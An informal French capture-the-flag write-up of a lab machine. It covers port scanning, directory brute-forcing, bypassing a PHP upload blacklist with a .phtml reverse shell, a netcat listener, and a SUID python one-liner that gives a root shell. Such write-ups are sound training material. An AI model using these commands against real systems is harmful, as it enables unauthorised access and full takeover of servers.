ctf rootme,ctf easy je crois

# 1 : SCAN NMAP
commande utilisée : nmap 10.10.237.48 -A -p-
détails :

-A  détection des versions/services

-p-  scan de tous les ports (pas juste les 1000 premiers)

-oN  output dans un fichier(genre -oN nmapresultats.txt)
# résultat :

port 22 : ssh → openSSH 7.6 (accès distant)

port 80 : http → apache 2.4.29 (serveur web ubuntu)

# 2:enumeration web
le but ici etant de brute forcer les sous domaines 
gobuster dir -u http://10.10.237.48/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuset = nom de l'outil
dir = directory donc ppur les sous domaines
-u pour préciser l'url
-w pour le path de la wordlist
# résultat :
/uploads : stockage fichiers
/panel : interface d'upload
/css, /js : fichiers frontend
répertoire caché intéressant : /panel
alors on peut uploader des fichiers,donc la premeire option ici serait de uploader un reverse shell sur la machine,mais après upload,rien ne se passe,le code ici n'a pas été executé en raison d'un filtre sur les fichiers .php,ici le soucis est que c'est une blacklist et non une white list
white list : autorise seulement les fichiers autorisés dans la liste
black list : autorise seulement les fichiers non présent dans la blacklist
# objectif : uploader un reverse shell malgré un filtrage de l’extension .php
on prend un reverse shell donc par exemple celui de pentest monkey,un reerse shell en php
on modifie ip ety port mais ca je pense que vous le savez
puis on renomme le fichier en .phtml
en fait il y a plusieurs extensions de fichiers pour le php,le code sera executé de la meme maniere,je n'ai pas lexplication mais voila,en fait dans la blacklist il y avait php mais pas phtml
on upload
et ca passe !!!!
# 3:reverse shell
objectif : exécuter le shell et avoir lacces
dabord on ecoute sur le port de notre rvshell
nc -lvnp 2121
puis on se rend ici 
http://10.10.237.48/uploads/php-reverse-shell.phtml
donc php reverse shell phtml es tle nom de mon fichier 
on a une connection!
# 4:stabilisation
comme d'habitude on stabilise le shell avec du python 
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
apres ctrl z 
puis
stty raw -echo; fg
on peux maintenant : tab, clear, ctrl+c etc.
# enum
on tape whoami && ls /home
utilisateur = www-data
2 users : rootme, test
flag user dans
cd /var/www
cat user.txt
# 5:privesc
but ? devenir root
chercher fichiers avec SUID (droits spéciaux root) :
find / -perm -4000 2>/dev/null
on en repere un plutot bizzare ( ON AURAIT AUSSI PU UTILISER LINPEAS COMEM G FAIT DANS ANONYMOUS MAIS HUM)
/usr/bin/python
si python a SUID, alors on peut faire :
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 et on devient root sur la machine 
 on tape whoami pr confirmer
 on est roooooooooooooooooooooooooooooot
 puis le flag se trouve lka
cd /root
cat root.txt
VOILA REVIEW DE CETTE MACHINE 










